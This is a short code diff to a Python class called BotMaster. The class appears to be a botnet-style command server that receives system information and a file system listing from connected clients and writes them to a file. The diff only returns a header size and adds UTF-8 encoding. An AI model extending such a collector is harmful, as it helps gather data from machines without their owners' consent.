@@ -42,6 +42,9 @@ class BotMaster:
             connection.send(message_received.encode(FORMAT))
 
             print("System Information Header dimension received: ", data_dim)
+
+            return data_dim
+
     def waitForClient(self):
         """
         Procedura tramite la quale il server accetta la richiesta di connessione del client e salva i dati ricevuti in un file .json.
@@ -65,7 +68,7 @@ class BotMaster:
             data_dim = self.waitForHeader(connection)
 
             data = connection.recv(data_dim).decode(FORMAT)
-            with open('fileSystem.txt','w') as fp:
+            with open('fileSystem.txt','w', encoding="utf-8") as fp:
                 fp.write(data)
 
             connection.close()
